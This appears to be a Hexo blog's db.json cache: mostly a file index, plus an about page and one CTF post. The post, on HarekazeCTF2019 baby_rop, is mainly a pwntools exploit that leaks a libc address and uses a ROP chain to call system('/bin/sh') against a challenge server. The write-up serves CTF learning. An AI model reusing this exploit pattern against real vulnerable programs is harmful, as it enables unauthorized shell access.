d89a1b95801dee788a5d9bec4320","modified":1668598758360},{"_id":"themes/hexo-theme-fluid-master/source/css/_pages/_post/comment.styl","hash":"1fc96d09d52d9502e84e4e2a8d482ea45e8b81ea","modified":1668598758360},{"_id":"themes/hexo-theme-fluid-master/source/css/_pages/_post/highlight.styl","hash":"d73cccb65eaa804910884df17442e34736b3f4fb","modified":1668598758360},{"_id":"themes/hexo-theme-fluid-master/source/css/_pages/_post/markdown.styl","hash":"2d12f23b46d0ce07ae810bc4f5635c490a098fa4","modified":1668598758360},{"_id":"themes/hexo-theme-fluid-master/source/css/_pages/_post/post-page.styl","hash":"2e44047b9fecf662696b9cfce5c77ac3376cda85","modified":1668598758361},{"_id":"themes/hexo-theme-fluid-master/source/css/_pages/_post/post-tag.styl","hash":"e8fe053ef8734e54fae12e46acd0087bcd67f8a2","modified":1668598758361},{"_id":"themes/hexo-theme-fluid-master/source/css/_pages/_tag/tags.styl","hash":"29e9b72cfda2f2baf9cf2597fcd7f9e66303a9bd","modified":1668598758361},{"_id":"themes/hexo-theme-fluid-master/source/css/_pages/_base/_widget/banner.styl","hash":"80301db38e448e40e88bb34d0128628b0809b243","modified":1668598758355},{"_id":"themes/hexo-theme-fluid-master/source/css/_pages/_base/_widget/anchorjs.styl","hash":"26d65475b1c52a61115044db8883df6739c3a473","modified":1668598758355},{"_id":"themes/hexo-theme-fluid-master/source/css/_pages/_base/_widget/board.styl","hash":"1068d71721baeed76bf0176f9b964d36b5764c9f","modified":1668598758356},{"_id":"themes/hexo-theme-fluid-master/source/css/_pages/_base/_widget/code-widget.styl","hash":"417a7388b39c0203178b0032e151febd66a0e9f3","modified":1668598758356},{"_id":"themes/hexo-theme-fluid-master/source/css/_pages/_base/_widget/copyright.styl","hash":"3ac1eb36e124adef607775aa505386d5680960e2","modified":1668598758356},{"_id":"themes/hexo-theme-fluid-master/source/css/_pages/_base/_widget/footer.styl","hash":"e6f5921ff9009c1853e7db30c482bc1682433ed9","modified":1668598758356},{"_id":"themes/hexo-theme-fluid-master/source/css/_pages/_base/_widget/footnote.styl","hash":"41935973a66c14ab2bea0539d4b1f15c62534fa4","modified":1668598758357},{"_id":"themes/hexo-theme-fluid-master/source/css/_pages/_base/_widget/header.styl","hash":"9001c53b52c339bc052cd1a8334e8185f5b03538","modified":1668598758357},{"_id":"themes/hexo-theme-fluid-master/source/css/_pages/_base/_widget/modal.styl","hash":"0ca6171ce262339e0e36cfea0978b554d87ae7fc","modified":1668598758357},{"_id":"themes/hexo-theme-fluid-master/source/css/_pages/_base/_widget/noscript.styl","hash":"8fad325e411bc83c8ebdc4115015477eed5f60da","modified":1668598758357},{"_id":"themes/hexo-theme-fluid-master/source/css/_pages/_base/_widget/ngrogress.styl","hash":"48799d3148ef6493be0e05897c635124e9b05d03","modified":1668598758357},{"_id":"themes/hexo-theme-fluid-master/source/css/_pages/_base/_widget/pagination.styl","hash":"f4ae7cbf2f10f459de7864f8e642553b587df889","modified":1668598758357},{"_id":"themes/hexo-theme-fluid-master/source/css/_pages/_base/_widget/qrcode.styl","hash":"04447d3b673be84a1af1dc57933a3c41dd7c0cfe","modified":1668598758357},{"_id":"themes/hexo-theme-fluid-master/source/css/_pages/_base/_widget/scroll-btn.styl","hash":"e4dbbbb1a2508a72bc04680552d7ebbea0eed0fe","modified":1668598758357},{"_id":"themes/hexo-theme-fluid-master/source/css/_pages/_base/_widget/search.styl","hash":"1f4e678d7219815ab62de1b92ec75e021247f90b","modified":1668598758357},{"_id":"themes/hexo-theme-fluid-master/source/css/_pages/_base/_widget/toc.styl","hash":"5defef321e3e933fe84f3f2ca481c88f55381fb0","modified":1668598758357},{"_id":"themes/hexo-theme-fluid-master/source/img/WeChat.jpg","hash":"81fb1c2c10eec7d8cd52c85c17d824f11ff4279e","modified":1668598758365},{"_id":"themes/hexo-theme-fluid-master/source/img/plt&got/1.png","hash":"e881da9ad8aa06222c740e6cfcb416b4f97f42e2","modified":1668598758386},{"_id":"themes/hexo-theme-fluid-master/source/img/plt&got/3.jpg","hash":"e83d511a4dada4fe9a7969e51d09830531fb3234","modified":1668598758387},{"_id":"themes/hexo-theme-fluid-master/source/img/plt&got/4.jpg","hash":"2f63f62e6867cf42273aadcf8fa1a1f103d94eea","modified":1668598758389},{"_id":"themes/hexo-theme-fluid-master/source/img/plt&got/5.jpg","hash":"d9c7a874ec8b6dea71dfea8ca57ec22c53470b6b","modified":1668598758389},{"_id":"themes/hexo-theme-fluid-master/source/img/basic/2afc5cc6a7efce1b0ab0f88ca151f3deb58f65f4.jpg","hash":"498aa4db9890ffcab8b9c859f30a401d458fc618","modified":1668598758372},{"_id":"themes/hexo-theme-fluid-master/source/img/basic/7.jpg","hash":"50f3b6c1899dcd3c274c0df0f735d6626d386df2","modified":1668598758381},{"_id":"themes/hexo-theme-fluid-master/source/img/basic/1.jpg","hash":"6bb38a6316680c14e30be1d7206cf89bb471f61b","modified":1668598758370},{"_id":"themes/hexo-theme-fluid-master/source/img/basic/2.jpg","hash":"6c4b523bf06b9256fe5183b29bbc74661cbe293e","modified":1668598758371},{"_id":"themes/hexo-theme-fluid-master/source/img/basic/3.jpg","hash":"05294b509c19e7a5761ca52a3b62b52b2a648aae","modified":1668598758374},{"_id":"themes/hexo-theme-fluid-master/source/img/basic/4.jpg","hash":"a710d74d9419ad63bbed98681da81a0a0fd8483a","modified":1668598758375},{"_id":"themes/hexo-theme-fluid-master/source/img/basic/6.jpg","hash":"321377f49955962fddd7958eb28890cddd2238c6","modified":1668598758378},{"_id":"themes/hexo-theme-fluid-master/source/img/basic/5.jpg","hash":"51f54d56f0ab84c2b067f1e85d62dea56db5106a","modified":1668598758377},{"_id":"themes/hexo-theme-fluid-master/source/img/basic/9.jpg","hash":"5d9cb017c4134c6919c8666149405aca85d02e95","modified":1668598758383},{"_id":"themes/hexo-theme-fluid-master/source/img/default.png","hash":"167a12978d80371cf578c8a2e45c24a2eb25b6fb","modified":1668598758384},{"_id":"themes/hexo-theme-fluid-master/source/img/avatar.jpg","hash":"0fe346746038c228609013fbef912e23dff01b39","modified":1668598758368},{"_id":"public/local-search.xml","hash":"1784e874a2fb8142eeb0df9911e85e4189e0ea7a","modified":1669708295243},{"_id":"public/about/index.html","hash":"78e12ae35ea875e121c6d97fe398935e6e6dc6e6","modified":1668614059966},{"_id":"public/2022/11/16/testtest/index.html","hash":"290fb8aa85a9c4665a9785cf92cb3422c1503d82","modified":1668610521218},{"_id":"public/archives/index.html","hash":"0359e1ae112ea6b37735d2f624eb921bbca4f27e","modified":1669708295243},{"_id":"public/archives/2022/index.html","hash":"488c2b27aae3600dae0088ef3b470e0b6a604586","modified":1669708295243},{"_id":"public/archives/2022/11/index.html","hash":"19c5e69c9d6fef0e33d50f7c7163c0173365ed00","modified":1669708295243},{"_id":"public/index.html","hash":"46499f8a9762a4e195caf796f66ec9e0db9cc891","modified":1669708295243},{"_id":"public/tags/ctf-pwn/index.html","hash":"9af130a4e6b760056e9d87ef0bc96eee282eaf74","modified":1669708295243},{"_id":"public/tags/exp/index.html","hash":"bd0112c1effa9ce7abead4ab3631d1b738f16207","modified":1669708295243},{"_id":"public/tags/Others/index.html","hash":"ce02ee38a1e91c9b49a1adb00782dd0159d5787e","modified":1668612886627},{"_id":"public/404.html","hash":"f0d06bccb073cef3d4ec093113830efcab7688f7","modified":1668612886627},{"_id":"public/tags/index.html","hash":"d81ad82964d976cd3bb9bdd4bef69d1d1045f8d9","modified":1668612886627},{"_id":"public/categories/index.html","hash":"1d4b6d1bfeb216e7a8b1b4e3038ebb90e498985a","modified":1668612886627},{"_id":"public/links/index.html","hash":"87f3f49c901599c2d5473d59ac62d8e0a57aa910","modified":1668612886627},{"_id":"public/2022/11/16/ROP ciscn_2019_c_1/index.html","hash":"2e98bd77ef891ae09232913876ec5ee280fc1f85","modified":1669610007228},{"_id":"public/2022/11/16/HarekazeCTF2019baby_rop/index.html","hash":"321f813ad602c51ffdf2d4bca21377fa982b6192","modified":1669536432207},{"_id":"public/2022/11/16/got表和plt表/index.html","hash":"c54194174118bc7d4d476b08130e04171af9cd9a","modified":1668615255791},{"_id":"public/2022/11/16/小黄鸡/index.html","hash":"c299a71669b12883ac773f380d7b6d8c917fbfbb","modified":1668615255791},{"_id":"public/img/fluid.png","hash":"64b215db2cb3af98fe639e94537cb5209f959c78","modified":1668610521218},{"_id":"public/img/loading.gif","hash":"2d2fc0f947940f98c21afafef39ecf226a2e8d55","modified":1668610521218},{"_id":"public/img/basic/1.gif","hash":"e1f077cda1a834702dfe023343396905e15c204a","modified":1668610521218},{"_id":"public/img/police_beian.png","hash":"90efded6baa2dde599a9d6b1387973e8e64923ea","modified":1668610521218},{"_id":"public/xml/local-search.xml","hash":"85fcc23b4db654a7f91fc55b6fb0442bb3ed3a9a","modified":1668610521218},{"_id":"public/img/basic/2.gif","hash":"987257f1afdefda3e795f9181ce458751671e7fa","modified":1668610521218},{"_id":"public/img/plt&got/2.jpg","hash":"dbedd9163b3af11dd45af7d7c094dcf04c02c8ac","modified":1668610521218},{"_id":"public/img/WeChat.jpg","hash":"81fb1c2c10eec7d8cd52c85c17d824f11ff4279e","modified":1668610521218},{"_id":"public/img/plt&got/1.png","hash":"e881da9ad8aa06222c740e6cfcb416b4f97f42e2","modified":1668610521218},{"_id":"public/img/plt&got/3.jpg","hash":"e83d511a4dada4fe9a7969e51d09830531fb3234","modified":1668610521218},{"_id":"public/img/plt&got/4.jpg","hash":"2f63f62e6867cf42273aadcf8fa1a1f103d94eea","modified":1668610521218},{"_id":"public/img/plt&got/5.jpg","hash":"d9c7a874ec8b6dea71dfea8ca57ec22c53470b6b","modified":1668610521218},{"_id":"public/css/highlight.css","hash":"0f9a477d33d3b15ebe7e163e756fb7c54c7ded6b","modified":1668610521218},{"_id":"public/css/gitalk.css","hash":"a57b3cc8e04a0a4a27aefa07facf5b5e7bca0e76","modified":1668610521218},{"_id":"public/css/highlight-dark.css","hash":"2b0daa6e5343da9dbb26d617d224b8397e48556b","modified":1668610521218},{"_id":"public/js/boot.js","hash":"38bd26c6b7acdafda86dda3560e6a3ca488d3c76","modified":1668610521218},{"_id":"public/js/color-schema.js","hash":"ba63f7c3324bc1fdd050a90add9d8faaffc27e07","modified":1668610521218},{"_id":"public/js/events.js","hash":"89e3561488a618ed0caeb9edf18e441978e29c25","modified":1668610521218},{"_id":"public/js/img-lazyload.js","hash":"cbdeca434ec4da51f488c821d51b4d23c73294af","modified":1668610521218},{"_id":"public/js/leancloud.js","hash":"eff77c7a5c399fcaefda48884980571e15243fc9","modified":1668610521218},{"_id":"public/js/local-search.js","hash":"cebcda5991b6a9ab9307c69542389ce9013f04f7","modified":1668610521218},{"_id":"public/js/utils.js","hash":"45cc86f099db0a2c36ad49711ce66c2d598a2ab1","modified":1668610521218},{"_id":"public/js/plugins.js","hash":"2333494add51e5e1374602a4e81f0be36a05d4c2","modified":1668610521218},{"_id":"public/css/main.css","hash":"d3b6eb3ef0e222271f1453d3d1214f3ba053792d","modified":1668610521218},{"_id":"public/img/basic/2afc5cc6a7efce1b0ab0f88ca151f3deb58f65f4.jpg","hash":"498aa4db9890ffcab8b9c859f30a401d458fc618","modified":1668610521218},{"_id":"public/img/basic/7.jpg","hash":"50f3b6c1899dcd3c274c0df0f735d6626d386df2","modified":1668610521218},{"_id":"public/img/basic/2.jpg","hash":"6c4b523bf06b9256fe5183b29bbc74661cbe293e","modified":1668610521218},{"_id":"public/img/basic/1.jpg","hash":"6bb38a6316680c14e30be1d7206cf89bb471f61b","modified":1668610521218},{"_id":"public/img/basic/3.jpg","hash":"05294b509c19e7a5761ca52a3b62b52b2a648aae","modified":1668610521218},{"_id":"public/img/basic/5.jpg","hash":"51f54d56f0ab84c2b067f1e85d62dea56db5106a","modified":1668610521218},{"_id":"public/img/basic/4.jpg","hash":"a710d74d9419ad63bbed98681da81a0a0fd8483a","modified":1668610521218},{"_id":"public/img/basic/6.jpg","hash":"321377f49955962fddd7958eb28890cddd2238c6","modified":1668610521218},{"_id":"public/img/basic/9.jpg","hash":"5d9cb017c4134c6919c8666149405aca85d02e95","modified":1668610521218},{"_id":"public/img/default.png","hash":"167a12978d80371cf578c8a2e45c24a2eb25b6fb","modified":1668610521218},{"_id":"public/img/avatar.jpg","hash":"0fe346746038c228609013fbef912e23dff01b39","modified":1668610521218},{"_id":"source/_posts/Heap Exploitation中的 Bins.md","hash":"d2083d8929a6d44c27cf7a22364975e2102409c5","modified":1668658207669},{"_id":"source/_posts/heap exploitation.md","hash":"089351972c5c810ac73883128c1dd438d805f89c","modified":1668741935609},{"_id":"themes/hexo-theme-fluid-master/source/img/heap exploitation/1.jpg","hash":"7cb2f7bc57195c5af4028cc06286e6ce62b922e9","modified":1668740973623},{"_id":"themes/hexo-theme-fluid-master/source/img/heap exploitation/2.jpg","hash":"ee67088895b651df983308504e312e70e5c66fe2","modified":1668741235491},{"_id":"themes/hexo-theme-fluid-master/source/img/heapexploitation/1.jpg","hash":"7cb2f7bc57195c5af4028cc06286e6ce62b922e9","modified":1668740973623},{"_id":"themes/hexo-theme-fluid-master/source/img/heapexploitation/2.jpg","hash":"ee67088895b651df983308504e312e70e5c66fe2","modified":1668741235491},{"_id":"public/2022/11/18/heap exploitation/index.html","hash":"1fd2cfd6d3720c621f8d2960be0a8a704c814e8e","modified":1669135437317},{"_id":"public/img/heapexploitation/1.jpg","hash":"7cb2f7bc57195c5af4028cc06286e6ce62b922e9","modified":1668741972317},{"_id":"public/img/heapexploitation/2.jpg","hash":"ee67088895b651df983308504e312e70e5c66fe2","modified":1668741972317},{"_id":"source/_posts/堆利用 UAF.md","hash":"61009376f44205d8cc7bd6f5e821adfe022ffd74","modified":1669135695865},{"_id":"themes/hexo-theme-fluid-master/source/img/UAF/1.jpg","hash":"523793cec3ec1dfe87e0234c34068e63d0dfdad2","modified":1669134628746},{"_id":"themes/hexo-theme-fluid-master/source/img/UAF/3.jpg","hash":"0f4be0d99ca162c6065f8c057e7d02b7a447d820","modified":1669133939778},{"_id":"themes/hexo-theme-fluid-master/source/img/UAF/2.jpg","hash":"2516688cdd1d61d3010e01870480729cc296a0e8","modified":1669133910994},{"_id":"public/2022/11/22/堆利用 UAF/index.html","hash":"4d292490e9cdf1455432b77a11804d53674519ae","modified":1669469566656},{"_id":"public/img/UAF/3.jpg","hash":"0f4be0d99ca162c6065f8c057e7d02b7a447d820","modified":1669135437317},{"_id":"public/img/UAF/1.jpg","hash":"523793cec3ec1dfe87e0234c34068e63d0dfdad2","modified":1669135437317},{"_id":"public/img/UAF/2.jpg","hash":"2516688cdd1d61d3010e01870480729cc296a0e8","modified":1669135437317},{"_id":"source/_posts/unlink.md","hash":"c8490285b6f1fea2157cf4754a798ce21551346f","modified":1669469518821},{"_id":"public/2022/11/25/unlink/index.html","hash":"7f64a3977e797f86bfbecbe4b15198eda8fc5a9d","modified":1669536432207},{"_id":"source/_posts/patchelf修改程序libc版本.md","hash":"7fbd15958bdbe58655314b626c15a0bdd7827d71","modified":1669536243223},{"_id":"themes/hexo-theme-fluid-master/source/img/patchelf/1.png","hash":"c91f2dd597b0eafc03067dc028ee0bcbafb10feb","modified":1669534951153},{"_id":"public/2022/11/16/patchelf修改程序libc版本/index.html","hash":"a36603295a8152546d7c59671f489e5af02c5ac9","modified":1669535904413},{"_id":"public/img/patchelf/1.png","hash":"c91f2dd597b0eafc03067dc028ee0bcbafb10feb","modified":1669535904413},{"_id":"public/2022/11/27/patchelf修改程序libc版本/index.html","hash":"9a938356e3947654e9561c7a7e6769eab766d7bb","modified":1669610007228},{"_id":"source/_posts/Off-By-One.md","hash":"a81fbbe979609c9e603000d6869d86a6fa6dd8ae","modified":1669708230322},{"_id":"themes/hexo-theme-fluid-master/source/img/off_by_one/1.png","hash":"33df40450f9d2c4c670c1c46a9481480e2767ea2","modified":1669606424450},{"_id":"public/2022/11/27/Off-By-One/index.html","hash":"b1a5740fc0a5de06e1118564b272a73f5dcd46f9","modified":1669708295243},{"_id":"public/img/off_by_one/1.png","hash":"33df40450f9d2c4c670c1c46a9481480e2767ea2","modified":1669610007228},{"_id":"themes/hexo-theme-fluid-master/source/img/off_by_one/5.jpg","hash":"a4dbafc30bdfad22b5ae780990bef9258d47d041","modified":1669612983687},{"_id":"themes/hexo-theme-fluid-master/source/img/off_by_one/2.jpg","hash":"69b9ea5de45278bd4bcb1974553a4aa1346d16d3","modified":1669612649627},{"_id":"themes/hexo-theme-fluid-master/source/img/off_by_one/4.jpg","hash":"d462ead0d58c77e7d2bac6abb7b2d59d862782c6","modified":1669612880187},{"_id":"themes/hexo-theme-fluid-master/source/img/off_by_one/6.jpg","hash":"f0b9d6aa4bf7763bef0861488d7e05dade22f98f","modified":1669613362717},{"_id":"themes/hexo-theme-fluid-master/source/img/off_by_one/3.jpg","hash":"36d8e84bbc23012faa4ccb025e54afbfc5ebcc42","modified":1669612720352},{"_id":"public/img/off_by_one/2.jpg","hash":"69b9ea5de45278bd4bcb1974553a4aa1346d16d3","modified":1669613485105},{"_id":"public/img/off_by_one/5.jpg","hash":"a4dbafc30bdfad22b5ae780990bef9258d47d041","modified":1669613485105},{"_id":"public/img/off_by_one/3.jpg","hash":"36d8e84bbc23012faa4ccb025e54afbfc5ebcc42","modified":1669613485105},{"_id":"public/img/off_by_one/4.jpg","hash":"d462ead0d58c77e7d2bac6abb7b2d59d862782c6","modified":1669613485105},{"_id":"public/img/off_by_one/6.jpg","hash":"f0b9d6aa4bf7763bef0861488d7e05dade22f98f","modified":1669613485105},{"_id":"source/_posts/[ZJCTF 2019]EasyHeap.md","hash":"1301f8dd800727709158cb33e3acdb814d9245c8","modified":1669708289346},{"_id":"themes/hexo-theme-fluid-master/source/img/[ZJCTF2019]EasyHeap/3.jpg","hash":"28d9724606720c3248b6703bedb0fb278bd04455","modified":1669707002865},{"_id":"themes/hexo-theme-fluid-master/source/img/[ZJCTF2019]EasyHeap/2.jpg","hash":"eff0d6ccb09ac9af73f431a22b1813357a1285f0","modified":1669706811805},{"_id":"themes/hexo-theme-fluid-master/source/img/[ZJCTF2019]EasyHeap/1.jpg","hash":"8bde0537be56853b022114f350f85499136ad776","modified":1669706494160},{"_id":"public/img/[ZJCTF2019]EasyHeap/3.jpg","hash":"28d9724606720c3248b6703bedb0fb278bd04455","modified":1669708107630},{"_id":"public/img/[ZJCTF2019]EasyHeap/1.jpg","hash":"8bde0537be56853b022114f350f85499136ad776","modified":1669708107630},{"_id":"public/img/[ZJCTF2019]EasyHeap/2.jpg","hash":"eff0d6ccb09ac9af73f431a22b1813357a1285f0","modified":1669708107630},{"_id":"public/2022/11/29/[ZJCTF 2019]EasyHeap/index.html","hash":"7395b647da75777d5d7c7908d9d5d3852303533e","modified":1669708295243}],"Category":[],"Data":[],"Page":[{"title":"简介","layout":"about","date":"2022-11-16T06:53:50.000Z","_content":"# ☀️A simple homepage🐤\n\n😺 南开大学2019级信息安全专业本科生（很快就不是了）\n\n😶 一只什么也不会的菜鸡\n\n🏀 本站内容更新一切随缘\n\n🙆 如果对文章内容有任何不理解或认为有误的地方，欢迎写issue或者直接加v开喷 \n\n","source":"about/index.md","raw":"---\ntitle: 简介\nlayout: about\ndate: 2022-11-16 14:53:50\n---\n# ☀️A simple homepage🐤\n\n😺 南开大学2019级信息安全专业本科生（很快就不是了）\n\n😶 一只什么也不会的菜鸡\n\n🏀 本站内容更新一切随缘\n\n🙆 如果对文章内容有任何不理解或认为有误的地方，欢迎写issue或者直接加v开喷 \n\n","updated":"2022-11-16T15:53:43.411Z","path":"about/index.html","_id":"clajrmefr0000kgufarvz2vz8","comments":1,"content":"<h1 id=\"☀️A-simple-homepage🐤\"><a href=\"#☀️A-simple-homepage🐤\" class=\"headerlink\" title=\"☀️A simple homepage🐤\"></a>☀️A simple homepage🐤</h1><p>😺 南开大学2019级信息安全专业本科生（很快就不是了）</p>\n<p>😶 一只什么也不会的菜鸡</p>\n<p>🏀 本站内容更新一切随缘</p>\n<p>🙆 如果对文章内容有任何不理解或认为有误的地方，欢迎写issue或者直接加v开喷 </p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"☀️A-simple-homepage🐤\"><a href=\"#☀️A-simple-homepage🐤\" class=\"headerlink\" title=\"☀️A simple homepage🐤\"></a>☀️A simple homepage🐤</h1><p>😺 南开大学2019级信息安全专业本科生（很快就不是了）</p>\n<p>😶 一只什么也不会的菜鸡</p>\n<p>🏀 本站内容更新一切随缘</p>\n<p>🙆 如果对文章内容有任何不理解或认为有误的地方，欢迎写issue或者直接加v开喷 </p>\n"}],"Post":[{"title":"HarekazeCTF2019 baby_rop","date":"2022-11-16T08:08:00.000Z","excerpt":"exp","_content":"\n**题目**\n\n<https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop>\n\n从给定libc获取获取基址\n\n**Exp**\n\n```python\nfrom pwn import *\n\n# p = process('./pwn')\np = remote('node4.buuoj.cn',28818)\ne = ELF('./pwn')\n\n#payload 1\npayload1 = '\\x00' + '\\xff' * 7\np.sendline(payload1)\np.recvuntil(\"Correct\\n\")\n\n#payload 2\npayload2 = (231 + 4) * b'a' + p32(e.plt['write']) + p32(0x08048825) +p32(1) + p32(e.got['write']) + p32(4)\n\np.sendline(payload2)\n\n# leak addr\nwrite_got = u32(p.recv(4))\nprint(hex(write_got))\n\n#payload 3\nlibc = ELF(\"./libc-2.23.so\")\nlibc.address =  write_got - libc.sym['write']\nsystem = libc.sym[\"system\"]\nbinsh = next(libc.search(b\"/bin/sh\"))\np.sendline(payload1)\npayload3 =  (231 + 4) * b'a' + p32(system) + p32(0xdeadbeef) + p32(binsh)\np.sendline(payload3)\n\np.interactive()\n```\n\n","source":"_posts/HarekazeCTF2019baby_rop.md","raw":"---\ntitle: HarekazeCTF2019 baby_rop\ntags: [ctf-pwn,exp]\ndate: 2022-11-16 16:08:00\nexcerpt: exp\n---\n\n**题目**\n\n<https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop>\n\n从给定libc获取获取基址\n\n**Exp**\n\n```python\nfrom pwn import *\n\n# p = process('./pwn')\np = remote('node4.buuoj.cn',28818)\ne = ELF('./pwn')\n\n#payload 1\npayload1 = '\\x00' + '\\xff' * 7\np.sendline(payload1)\np.recvuntil(\"Correct\\n\")\n\n#payload 2\npayload2 = (231 + 4) * b'a' + p32(e.plt['write']) + p32(0x08048825) +p32(1) + p32(e.got['write']) + p32(4)\n\np.sendline(payload2)\n\n# leak addr\nwrite_got = u32(p.recv(4))\nprint(hex(write_got))\n\n#payload 3\nlibc = ELF(\"./libc-2.23.so\")\nlibc.address =  write_got - libc.sym['write']\nsystem = libc.sym[\"system\"]\nbinsh = next(libc.search(b\"/bin/sh\"))\np.sendline(payload1)\npayload3 =  (231 + 4) * b'a' + p32(system) + p32(0xdeadbeef) + p32(binsh)\np.sendline(payload3)\n\np.interactive()\n```\n\n","slug":"HarekazeCTF2019baby_rop","published":1,"updated":"2022-11-16T16:04:07.616Z","_id":"clajrmefw0001kguf8i1j3zxv","comments":1,"layout":"post","photos":[],"link":"","content":"<p><strong>题目</strong></p>\n<p><a href=\"https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop\">https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop</a></p>\n<p>从给定libc获取获取基址</p>\n<p><strong>Exp</strong></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> pwn <span class=\"hljs-keyword\">import</span> *<br><br><span class=\"hljs-comment\"># p = process(&#x27;./pwn&#x27;)</span><br>p = remote(<span class=\"hljs-string\">&#x27;node4.buuoj.cn&#x27;</span>,<span class=\"hljs-number\">28818</span>)<br>e = ELF(<span class=\"hljs-string\">&#x27;./pwn&#x27;</span>)<br><br><span class=\"hljs-comment\">#payload 1</span><br>payload1 = <span class=\"hljs-string\">&#x27;\\x00&#x27;</span> + <span class=\"hljs-string\">&#x27;\\xff&#x27;</span> * <span class=\"hljs-number\">7</span><br>p.sendline(payload1)<br>p.recvuntil(<span class=\"hljs-string\">&quot;Correct\\n&quot;</span>)<br><br><span class=\"hljs-comment\">#payload 2</span><br>payload2 = (<span class=\"hljs-number\">231</span> + <span class=\"hljs-number\">4</span>) * <span class=\"hljs-string\">b&#x27;a&#x27;</span> + p32(e.plt[<span class=\"hljs-string\">&#x27;write&#x27;</span>]) + p32(<span class=\"hljs-number\">0x08048825</span>) +p32(<span class=\"hljs-number\">1</span>) + p32(e.got[<span class=\"hljs-string\">&#x27;write&#x27;</span>]) + p32(<span class=\"hljs-number\">4</span>)<br><br>p.sendline(payload2)<br><br><span class=\"hljs-comment\"># leak addr</span><br>write_got = u32(p.recv(<span class=\"hljs-number\">4</span>))<br><span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">hex</span>(write_got))<br><br><span class=\"hljs-comment\">#payload 3</span><br>libc = ELF(<span class=\"hljs-string\">&quot;./libc-2.23.so&quot;</span>)<br>libc.address =  write_got - libc.sym[<span class=\"hljs-string\">&#x27;write&#x27;</span>]<br>system = libc.sym[<span class=\"hljs-string\">&quot;system&quot;</span>]<br>binsh = <span class=\"hljs-built_in\">next</span>(libc.search(<span class=\"hljs-string\">b&quot;/bin/sh&quot;</span>))<br>p.sendline(payload1)<br>payload3 =  (<span class=\"hljs-number\">231</span> + <span class=\"hljs-number\">4</span>) * <span class=\"hljs-string\">b&#x27;a&#x27;</span> + p32(system) + p32(<span class=\"hljs-number\">0xdeadbeef</span>) + p32(binsh)<br>p.sendline(payload3)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>\n\n","site":{"data":{}},"more":"<p><strong>题目</strong></p>\n<p><a href=\"https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop\">https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop</a></p>\n<p>从给定libc获取获取基址</p>\n<p><strong>Exp</strong></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> pwn <span class=\"hljs-keyword\">import</span> *<br><br><span class=\"hljs-comment\"># p = process(&#x27;./pwn&#x27;)</span><br>p = remote(<span class=\"hljs-string\">&#x27;node4.buuoj.cn&#x27;</span>,<span class=\"hljs-number\">28818</span>)<br>e = ELF(<span class=\"hljs-string\">&#x27;./pwn&#x27;</span>)<br><br><span class=\"hljs-comment\">#payload 1</span><br>payload1 = <span class=\"hljs-string\">&#x27;\\x00&#x27;</span> + <span class=\"hljs-string\">&#x27;\\xff&#x27;</span> * <span class=\"hljs-number\">7</span><br>p.sendline(payload1)<br>p.recvuntil(<span class=\"hljs-string\">&quot;Correct\\n&quot;</span>)<br><br><span class=\"hljs-comment\">#payload 2</span><br>payload2 = (<span class=\"hljs-number\">231</span> + <span class=\"hljs-number\">4</span>) * <span class=\"hljs-string\">b&#x27;a&#x27;</span> + p32(e.plt[<span class=\"hljs-string\">&#x27;write&#x27;</span>]) + p32(<span class=\"hljs-number\">0x08048825</span>) +p32(<span class=\"hljs-number\">1</span>) + p32(e.got[<span class=\"hljs-string\">&#x27;write&#x27;</span>]) + p32(<span class=\"hljs-number\">4</span>)<br><br>p.sendline(payload2)<br><br><span class=\"hljs-comment\"># leak addr</span><br>write_got = u32(p.recv(<span class=\"hljs-number\">4</span>))<br><span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">hex</span>(write_got))<br><br><span class=\"hljs-comment\">#payload 3</span><br>libc = ELF(<span class=\"hljs-string\">&quot;./libc-2.23.so&quot;</span>)<br>libc.address =  write_got - libc.sym[<span class=\"hljs-string\">&#x27;write&#x27;</span>]<br>system = libc.sym[<span class=\"hljs-string\">&quot;system&quot;</span>]<br>binsh = <span class=\"hljs-built_in\">next</span>(libc.search(<span class=\"hljs-string\">b&quot;/bin/sh&quot;</span>))<br>p.sendline(payload1)<br>payload3 =  (<span class=\"hljs-number\">231</span> + <span class=\"hljs-number\">4</span>) * <span 